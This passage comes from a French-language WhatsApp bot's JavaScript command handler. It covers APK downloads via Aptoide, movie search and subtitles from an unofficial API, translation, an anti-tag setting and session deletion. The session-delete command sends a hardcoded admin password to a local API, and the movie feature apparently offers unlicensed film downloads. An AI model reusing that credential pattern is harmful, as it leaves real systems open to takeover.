│. ˚˖𓍢ִ໋📦 *𝐘𝐎𝐔 𝐌𝐎𝐃 𝐀𝐏𝐊*
│. ˚˖𓍢ִ໋🔎 Recherche : *${query}*
│. ˚˖𓍢ִ໋⏳ Connexion aux serveurs...
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    const { data } = await axios.get(
      `https://ws75.aptoide.com/api/7/apps/search/query=${encodeURIComponent(query)}/limit=1`,
      { timeout: 15000 }
    );

    if (!data?.datalist?.list?.length) {
      await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📦 *𝐘𝐎𝐔 𝐌𝐎𝐃 𝐀𝐏𝐊*
│. ˚˖𓍢ִ໋❌ Aucune application trouvée
│. ˚˖𓍢ִ໋💡 Vérifie l'orthographe
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const app = data.datalist.list[0];

    const name    = app.name || "Application";
    const pkg     = app.package || "";
    const version = app.file?.vername || "";
    const dev     = app.store?.name || "";
    const sizeStr = app.file?.filesize
      ? (app.file.filesize / (1024 * 1024)).toFixed(1) + " MB"
      : "Inconnu";
    const rating  = app.stats?.rating?.avg || "";
    const dlLink  = app.file?.path;

    if (!dlLink) throw new Error("Lien APK introuvable.");

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📦 *𝐘𝐎𝐔 𝐌𝐎𝐃 𝐀𝐏𝐊*
│. ˚˖𓍢ִ໋✅ *Application trouvée !*
│. ˚˖𓍢ִ໋📦 *${name}*
${pkg     ? `│. ˚˖𓍢ִ໋🔖 Package : ${pkg}\n`      : ''}\
${version ? `│. ˚˖𓍢ִ໋🏷️ Version : ${version}\n`  : ''}\
${dev     ? `│. ˚˖𓍢ִ໋🏢 Store   : ${dev}\n`      : ''}\
│. ˚˖𓍢ִ໋📊 Taille  : ${sizeStr}
${rating  ? `│. ˚˖𓍢ִ໋⭐ Note    : ${rating}/5\n` : ''}\
│. ˚˖𓍢ִ໋📲 Envoi APK en cours...
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    await socket.sendMessage(sender, {
      document: { url: dlLink },
      mimetype: "application/vnd.android.package-archive",
      fileName: `${name}.apk`
    }, { quoted: msg });

    await socket.sendMessage(from, { react: { text: '✅', key: msg.key } });

  } catch (e) {
    console.error('[APK ERROR]', e);
    await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📦 *𝐘𝐎𝐔 𝐌𝐎𝐃 𝐀𝐏𝐊*
│. ˚˖𓍢ִ໋❌ Erreur APK Store
│. ˚˖𓍢ִ໋💡 Réessaie dans quelques secondes
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}
      
// === COMMANDE RECHERCHE DE FILMS ===
case 'sm':
case 'movie':
case 'silent': {
    try {
        const query = args.join(" ");
        if (!query) {
            await socket.sendMessage(sender, { 
                text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🎥 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐌𝐎𝐕𝐈𝐄*
│. ˚˖𓍢ִ໋❌ ᴀᴜᴄᴜɴ ɴᴏᴍ ғᴏᴜʀɴɪ
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ : ${prefix}${command} <ɴᴏᴍ ғɪʟᴍ>
│. ˚˖𓍢ִ໋💡 ᴇx : ${prefix}${command} ʙᴀᴛᴍᴀɴ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
            }, { quoted: msg });
            break;
        }

        await socket.sendMessage(jid, { react: { text: '🔎', key: msg.key } });

        await socket.sendMessage(sender, { 
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🎥 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐌𝐎𝐕𝐈𝐄*
│. ˚˖𓍢ִ໋🔎 ʀᴇᴄʜᴇʀᴄʜᴇ : "${query}"
│. ˚˖𓍢ִ໋⏳ sᴄᴀɴ sᴇʀᴠᴇᴜʀs...
│. ˚˖𓍢ִ໋📡 ɢéɴéʀᴀᴛɪᴏɴ ᴄᴀʀᴛᴇs...
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });

        const axios = require('axios');
        
        const { data } = await axios.get(`https://darkvibe314-silent-movies-api.hf.space/api/search`, {
            params: { query: query },
            timeout: 30000
        });

        if (!data.results || data.results.length === 0) {
            await socket.sendMessage(sender, { 
                text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🎥 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐌𝐎𝐕𝐈𝐄*
│. ˚˖𓍢ִ໋❌ ᴀᴜᴄᴜɴ ғɪʟᴍ ᴛʀᴏᴜᴠé
│. ˚˖𓍢ִ໋💡 ᴇssᴀʏᴇ ᴀᴜᴛʀᴇ ᴍᴏᴛ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
            }, { quoted: msg });
            break;
        }

        const results = data.results.slice(0, 5);
        const cards = [];

        if (!global.movieSubCache) global.movieSubCache = {};

        for (let i = 0; i < results.length; i++) {
            const movie = results[i];
            const title = (movie.title || "Inconnu").slice(0, 50);
            const isSeries = movie.subjectType === 2; 

            global.movieSubCache[movie.subjectId] = movie.subtitles || "None";
            
            const subText = movie.subtitles 
                ? movie.subtitles.split(',').slice(0, 3).join(', ') + "..." 
                : 'Aucun';

            const desc = 
`⭐ ɪᴍᴅʙ: ${movie.imdbRatingValue || 'N/A'}
🎭 ɢᴇɴʀᴇ: ${movie.genre || 'N/A'}
📅 ᴀɴɴéᴇ: ${movie.releaseDate?.split('-')[0] || 'Inconnue'}
📌 ᴛʏᴘᴇ: ${isSeries ? 'séʀɪᴇ 📺' : 'ғɪʟᴍ 🎬'}
💬 sᴏᴜs-ᴛɪᴛʀᴇs: ${subText}`;

            const coverUrl = movie.cover?.url || '';

            const { generateWAMessageContent } = require('@rexxhayanasi/elaina-baileys');
            
            const media = await generateWAMessageContent({
                image: { url: coverUrl }
            }, { upload: socket.waUploadToServer });

            let actionButtons = [];
            
            if (isSeries) {
                actionButtons.push({ 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "📺 ᴛéʟéᴄʜᴀʀɢᴇʀ", id: `.dlmovie ${movie.subjectId} 1 1` }) 
                });
                actionButtons.push({ 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "📝 sᴏᴜs-ᴛɪᴛʀᴇs", id: `.smsubs ${movie.subjectId} 1 1` }) 
                });
            } else {
                actionButtons.push({ 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "🎬 ᴛéʟéᴄʜᴀʀɢᴇʀ", id: `.dlmovie ${movie.subjectId} null null` }) 
                });
                actionButtons.push({ 
                    name: "quick_reply", 
                    buttonParamsJson: JSON.stringify({ display_text: "📝 sᴏᴜs-ᴛɪᴛʀᴇs", id: `.smsubs ${movie.subjectId} null null` }) 
                });
            }

            cards.push({
                body: { text: desc },
                header: { 
                    title: `🎬 ${title}`, 
                    hasMediaAttachment: true, 
                    imageMessage: media.imageMessage 
                },
                nativeFlowMessage: { buttons: actionButtons }
            });
        }

        const { generateWAMessageFromContent } = require('@rexxhayanasi/elaina-baileys');
        
        const interactiveMessage = {
            body: { 
                text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🎥 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐌𝐎𝐕𝐈𝐄*
│. ˚˖𓍢ִ໋🎬 ʀéꜱᴜʟᴛᴀᴛꜱ : ${query}
│. ˚˖𓍢ִ໋👉 sᴡɪᴘᴇ ᴘᴏᴜʀ ᴄʜᴏɪsɪʀ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
            },
            carouselMessage: { cards: cards, messageVersion: 1 }
        };

        const msgContent = generateWAMessageFromContent(jid, {
            viewOnceMessage: { 
                message: { 
                    messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 }, 
                    interactiveMessage: interactiveMessage 
                } 
            }
        }, { quoted: msg, userJid: sender });

        await socket.relayMessage(jid, msgContent.message, { messageId: msgContent.key.id });
        await socket.sendMessage(jid, { react: { text: '✅', key: msg.key } });

    } catch (e) {
        console.error("[MOVIE SEARCH ERROR]", e.message);
        await socket.sendMessage(sender, { 
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🎥 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐌𝐎𝐕𝐈𝐄*
│. ˚˖𓍢ִ໋❌ ᴇʀʀᴇᴜʀ ᴅᴇ ʀᴇᴄʜᴇʀᴄʜᴇ
│. ˚˖𓍢ִ໋📛 ${e.response?.data?.detail || e.message}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });

        await socket.sendMessage(jid, { react: { text: '❌', key: msg.key } });
    }
    break;
}
// === COMMANDE SOUS-TITRES ===
case 'smsubs': {
    try {
        const movieId = args[0];
        const season = args[1] === 'null' ? null : args[1];
        const episode = args[2] === 'null' ? null : args[2];
        
        if (!movieId) {
            await socket.sendMessage(sender, { 
                text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📝 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐌𝐎𝐕𝐈𝐄*
│. ˚˖𓍢ִ໋❌ ᴀᴜᴄᴜɴ ɪᴅ ғᴏᴜʀɴɪ
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ : .smsubs <ɪᴅ> [sᴀɪsᴏɴ] [ᴇᴘɪsᴏᴅᴇ]
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
            }, { quoted: msg });
            break;
        }
        
        const cachedSubs = global.movieSubCache?.[movieId];
        if (!cachedSubs || cachedSubs === 'None') {
            await socket.sendMessage(sender, { 
                text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📝 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐌𝐎𝐕𝐈𝐄*
│. ˚˖𓍢ִ໋❌ ᴀᴜᴄᴜɴ sᴏᴜs-ᴛɪᴛʀᴇ ᴅɪsᴘᴏɴɪʙʟᴇ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
            }, { quoted: msg });
            break;
        }

        const subList = cachedSubs.split(',').map(s => s.trim());

        const rows = subList.map(sub => ({
            header: "",
            title: `📝 ${sub}`,
            description: `ᴛéʟéᴄʜᴀʀɢᴇʀ sᴏᴜs-ᴛɪᴛʀᴇ (${sub})`,
            id: `.dlmovie ${movieId} ${season || 'null'} ${episode || 'null'} ${sub}`
        }));

        const sections = [{ title: "🌐 ʟᴀɴɢᴜᴇs ᴅɪsᴘᴏɴɪʙʟᴇs", rows }];

        const { generateWAMessageFromContent } = require('@rexxhayanasi/elaina-baileys');
        
        const interactiveMsg = generateWAMessageFromContent(jid, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                    interactiveMessage: {
                        body: { 
                            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📝 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐌𝐎𝐕𝐈𝐄*
│. ˚˖𓍢ִ໋🗣️ ᴄʜᴏɪsɪs ʟᴀ ʟᴀɴɢᴜᴇ
│. ˚˖𓍢ִ໋👇 sᴇʟᴇᴄᴛɪᴏɴ ᴄɪ-ᴅᴇssᴏᴜs
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
                        },
                        footer: { text: "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓" },
                        header: { 
                            title: "📝 𝐒𝐎𝐔𝐒-𝐓𝐈𝐓𝐑𝐄𝐒", 
                            subtitle: "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓", 
                            hasMediaAttachment: false 
                        },
                        nativeFlowMessage: {
                            buttons: [{ 
                                name: "single_select", 
                                buttonParamsJson: JSON.stringify({ 
                                    title: "🌐 𝐒𝐄𝐋𝐄𝐂𝐓 𝐋𝐀𝐍𝐆𝐔𝐄", 
                                    sections 
                                }) 
                            }]
                        }
                    }
                }
            }
        }, { quoted: msg, userJid: sender });

        await socket.relayMessage(jid, interactiveMsg.message, { messageId: interactiveMsg.key.id });

    } catch (e) {
        console.error("[SMSUBS ERROR]", e.message);
        await socket.sendMessage(sender, { 
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📝 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐌𝐎𝐕𝐈𝐄*
│. ˚˖𓍢ִ໋❌ ᴇʀʀᴇᴜʀ sᴏᴜs-ᴛɪᴛʀᴇ
│. ˚˖𓍢ִ໋📛 ${e.message}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });
    }
    break;
}
      
// ============================================================
// TRANSLATE — Traduction via Google Translate
// ============================================================
case 'translate':
case 'tl':
case 'trt':
case 'tr': {
  try {
    const { translate } = require('@vitalets/google-translate-api');

    const quotedCtx = msg.message?.extendedTextMessage?.contextInfo;
    const quotedMsg = quotedCtx?.quotedMessage;

    const quotedText = quotedMsg?.conversation
      || quotedMsg?.extendedTextMessage?.text
      || quotedMsg?.imageMessage?.caption
      || quotedMsg?.videoMessage?.caption
      || null;

    const isReply = !!quotedText;

    let lang = 'en';
    let text = '';

    if (isReply) {
      lang = (args[0] && args[0].length === 2) ? args[0] : 'en';
      text = quotedText;
    } else {
      if (!args.length) {
        await socket.sendMessage(sender, {
          text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🌐 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐓𝐑𝐀𝐍𝐒𝐋𝐀𝐓𝐄*
│. ˚˖𓍢ִ໋❌ ᴀᴜᴄᴜɴ ᴛᴇxᴛᴇ ғᴏᴜʀɴɪ
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ :
│. ˚˖𓍢ִ໋   ${prefix}tr <ʟᴀɴɢᴜᴇ> <ᴛᴇxᴛᴇ>
│. ˚˖𓍢ִ໋   ${prefix}tr <ᴛᴇxᴛᴇ> → ᴇɴɢʟɪsʜ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });
        break;
      }

      if (args[0].length === 2) {
        lang = args[0];
        text = args.slice(1).join(' ').trim();
      } else {
        lang = 'en';
        text = args.join(' ').trim();
      }

      if (!text) {
        await socket.sendMessage(sender, {
          text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🌐 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐓𝐑𝐀𝐍𝐒𝐋𝐀𝐓𝐄*
│. ˚˖𓍢ִ໋❌ ᴛᴇxᴛᴇ ᴍᴀɴǫᴜᴀɴᴛ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });
        break;
      }
    }

    await socket.sendMessage(from, { react: { text: '🌐', key: msg.key } });

    const result = await translate(text, { to: lang, autoCorrect: true });

    if (!result?.text) throw new Error('Traduction échouée.');

    const fromLang = result?.raw?.src
      || result?.from?.language?.iso
      || '?';

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🌐 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐓𝐑𝐀𝐍𝐒𝐋𝐀𝐓𝐄*
│. ˚˖𓍢ִ໋🔤 ᴏʀɪɢɪɴᴀʟ (${fromLang})
│. ˚˖𓍢ִ໋   ${text}
│. ˚˖𓍢ִ໋✅ ᴛʀᴀɴsʟᴀᴛɪᴏɴ (${lang})
│. ˚˖𓍢ִ໋   ${result.text}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    await socket.sendMessage(from, { react: { text: '✅', key: msg.key } });

  } catch (e) {
    console.error('[TRANSLATE ERROR]', e);
    await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🌐 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐓𝐑𝐀𝐍𝐒𝐋𝐀𝐓𝐄*
│. ˚˖𓍢ִ໋❌ ᴇʀʀᴇᴜʀ ᴅᴇ ᴛʀᴀɴsʟᴀᴛɪᴏɴ
│. ˚˖𓍢ִ໋📛 ${e.message || e}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}

case 'antitag': {
  try {
    if (!isOwner) {
      await socket.sendMessage(sender, { 
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🛡️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐍𝐓𝐈𝐓𝐀𝐆*
│. ˚˖𓍢ִ໋❌ ᴀᴄᴄèꜱ ʀᴇꜰᴜꜱé
│. ˚˖𓍢ִ໋👑 ᴏɴʟʏ ᴏᴡɴᴇʀ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const validModes = ['off', 'delete', 'remove'];
    const newMode = args[0]?.toLowerCase();

    if (!newMode || !validModes.includes(newMode)) {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🛡️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐍𝐓𝐈𝐓𝐀𝐆*
│. ˚˖𓍢ִ໋❌ ᴍᴏᴅᴇ ɪɴᴠᴀʟɪᴅᴇ
│. ˚˖𓍢ִ໋📌 ᴍᴏᴅᴇs : off | delete | remove
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const botNumberForConfig = socket.user?.id?.split(':')[0] + '@s.whatsapp.net' || socket.user?.id;
    if (!botNumberForConfig) throw new Error('Impossible de récupérer le numéro du bot');

    const currentConfig = await loadUserConfigFromMongo(botNumberForConfig) || {};

    currentConfig.ANTI_TAG_MODE = newMode;

    await setUserConfigInMongo(botNumberForConfig, currentConfig);

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🛡️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐍𝐓𝐈𝐓𝐀𝐆*
│. ˚˖𓍢ִ໋✅ ᴀᴛɪᴠᴀᴛɪᴏɴ ᴍɪꜱᴇ à ᴊᴏᴜʀ
│. ˚˖𓍢ִ໋⚙️ ᴍᴏᴅᴇ : ${newMode}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

  } catch (e) {
    console.error('[ANTITAG CMD ERROR]', e);
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🛡️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐍𝐓𝐈𝐓𝐀𝐆*
│. ˚˖𓍢ִ໋❌ ᴇʀʀᴇᴜʀ sʏsᴛᴇᴍ
│. ˚˖𓍢ִ໋📛 ${e.message}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}
case 'delsession': {
  try {
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum = String(config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');

    if (senderNum !== ownerNum) {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🗑️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐄𝐒𝐒𝐈𝐎𝐍*
│. ˚˖𓍢ִ໋❌ ᴀᴄᴄèꜱ ʀᴇꜰᴜꜱé
│. ˚˖𓍢ִ໋👑 ᴏɴʟʏ ᴏᴡɴᴇʀ ɢʟᴏʙᴀʟ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const target = (args[0] || '').replace(/[^0-9]/g, '');
    if (!target) {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🗑️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐄𝐒𝐒𝐈𝐎𝐍*
│. ˚˖𓍢ִ໋⚙️ ᴜsᴀɢᴇ : .delsession <ɴᴜᴍᴇʀᴏ>
│. ˚˖𓍢ִ໋📌 ᴇx : .delsession 0000000000
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const fetch = require('node-fetch');
    const resp = await fetch('http://localhost:2036/api/session/delete', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-admin-pass': 'adminowner'
      },
      body: JSON.stringify({ number: target })
    });

    let data;
    try {
      data = await resp.json();
    } catch (e) {
      const text = await resp.text();
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🗑️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐄𝐒𝐒𝐈𝐎𝐍*
│. ˚˖𓍢ִ໋❌ ʀéᴘᴏɴsᴇ ɪɴᴠᴀʟɪᴅᴇ
│. ˚˖𓍢ִ໋📛 ${text}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    if (data.ok) {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🗑️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐄𝐒𝐒𝐈𝐎𝐍*
│. ˚˖𓍢ִ໋✅ sᴇssɪᴏɴ sᴜᴘᴘʀɪᴍéᴇ
│. ˚˖𓍢ִ໋📱 ɴᴜᴍᴇʀᴏ : ${target}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    } else {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🗑️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐄𝐒𝐒𝐈𝐎𝐍*
│. ˚˖𓍢ִ໋❌ éᴄʜᴇᴄ
│. ˚˖𓍢ִ໋📛 ${data.error || 'ʀéᴘᴏɴsᴇ ɪɴᴀᴛᴛᴇɴᴅᴜᴇ'}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

  } catch (err) {
    console.error('[DELSESSION ERROR]', err);
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🗑️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐒𝐄𝐒𝐒𝐈𝐎𝐍*
│. ˚˖𓍢ִ໋❌ ᴇʀʀᴇᴜʀ sʏsᴛᴇᴍ
│. ˚˖𓍢ִ໋📛 ${err.message || err}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}


 case 'detect': {
  try {
    // Récupérer la source du message (supporte conversation simple et extendedTextMessage)
    const raw = msg.message || {};
    const quoted = raw.extendedTextMessage?.contextInfo?.quotedMessage
      || raw.extendedTextMessage?.contextInfo?.stanzaId && raw.extendedTextMessage?.contextInfo?.quotedMessage
      || raw.imageMessage?.contextInfo?.quotedMessage
      || raw.videoMessage?.contextInfo?.quotedMessage
      || raw.audioMessage?.contextInfo?.quotedMessage
      || null;

    // Si la commande n'est pas utilisée en réponse, on informe l'utilisateur
    if (!quoted) {
      await socket.sendMessage(sender, {
        text: 'ℹ️ Utilisation : répondez à un message puis envoyez la commande .detect pour voir sa structure.'
      }, { quoted: msg });
      break;
    }

    // Helper : extraire le type principal du message cité
    function detectMessageType(q) {
      if (!q) return 'unknown';
      const keys = Object.keys(q);
      // Priorité sur les types connus
      const types = ['conversation','extendedTextMessage','imageMessage','videoMessage','audioMessage','stickerMessage','documentMessage','contactMessage','locationMessage','productMessage','buttonsResponseMessage','listResponseMessage','templateMessage'];
      for (const t of types) if (q[t]) return t;
      // fallback : premier key non metadata
      return keys.length ? keys[0] : 'unknown';
    }

    // Helper : construire un objet résumé sans données binaires lourdes
    function summarizeMessage(q) {
      const type = detectMessageType(q);
      const summary = { type, rawKeys: Object.keys(q) };

      // texte
      if (q.conversation) summary.text = q.conversation;
      if (q.extendedTextMessage) {
        summary.extendedText = q.extendedTextMessage.text || null;
        summary.extendedContext = q.extendedTextMessage.contextInfo ? {
          stanzaId: q.extendedTextMessage.contextInfo.stanzaId || null,
          participant: q.extendedTextMessage.contextInfo.participant || null,
          quotedMessageKeys: q.extendedTextMessage.contextInfo.quotedMessage ? Object.keys(q.extendedTextMessage.contextInfo.quotedMessage) : null
        } : null;
      }

      // image
      if (q.imageMessage) {
        summary.image = {
          mimetype: q.imageMessage.mimetype || null,
          caption: q.imageMessage.caption || null,
          fileSha256: q.imageMessage.fileSha256 ? Buffer.from(q.imageMessage.fileSha256).toString('hex') : null,
          fileLength: q.imageMessage.fileLength || null,
          url: q.imageMessage.url || null
        };
      }

      // video
      if (q.videoMessage) {
        summary.video = {
          mimetype: q.videoMessage.mimetype || null,
          caption: q.videoMessage.caption || null,
          seconds: q.videoMessage.seconds || null,
          fileLength: q.videoMessage.fileLength || null,
          url: q.videoMessage.url || null
        };
      }

      // audio
      if (q.audioMessage) {
        summary.audio = {
          mimetype: q.audioMessage.mimetype || null,
          seconds: q.audioMessage.seconds || null,
          ptt: !!q.audioMessage.ptt,
          fileLength: q.audioMessage.fileLength || null,
          url: q.audioMessage.url || null
        };
      }

      // document
      if (q.documentMessage) {
        summary.document = {
          fileName: q.documentMessage.fileName || null,
          mimetype: q.documentMessage.mimetype || null,
          fileLength: q.documentMessage.fileLength || null,
          url: q.documentMessage.url || null
        };
      }

      // sticker
      if (q.stickerMessage) {
        summary.sticker = {
          isAnimated: !!q.stickerMessage.isAnimated,
          isVideo: !!q.stickerMessage.isVideo,
          fileSha256: q.stickerMessage.fileSha256 ? Buffer.from(q.stickerMessage.fileSha256).toString('hex') : null
        };
      }

      // contact / location / product
      if (q.contactMessage) summary.contact = { displayName: q.contactMessage.displayName || null, vcard: !!q.contactMessage.vcard };
      if (q.locationMessage) summary.location = { degreesLatitude: q.locationMessage.degreesLatitude || null, degreesLongitude: q.locationMessage.degreesLongitude || null, name: q.locationMessage.name || null };
      if (q.productMessage) summary.product = { productId: q.productMessage.product?.id || null, title: q.productMessage.product?.title || null };

      // metadata utile
      if (q.contextInfo) {
        summary.contextInfo = {
          mentionedJid: q.contextInfo.mentionedJid || null,
          externalAdReply: q.contextInfo.externalAdReply ? {
            title: q.contextInfo.externalAdReply.title || null,
            mediaType: q.contextInfo.externalAdReply.mediaType || null,
            mediaUrl: q.contextInfo.externalAdReply.mediaUrl || null
          } : null
        };
      }

      return summary;
    }

    // Construire le rapport
    const report = {
      inspectedAt: new Date().toISOString(),
      chat: msg.key?.remoteJid || 'unknown',
      isGroup: (msg.key?.remoteJid || '').endsWith('@g.us'),
      quotedMessageKey: {
        id: raw.extendedTextMessage?.contextInfo?.stanzaId || raw.extendedTextMessage?.contextInfo?.quotedMessage?.key?.id || null,
        participant: raw.extendedTextMessage?.contextInfo?.participant || raw.extendedTextMessage?.contextInfo?.quotedMessage?.key?.participant || null
      },
      summary: summarizeMessage(quoted)
    };

    // Envoyer le rapport formaté (limiter la taille)
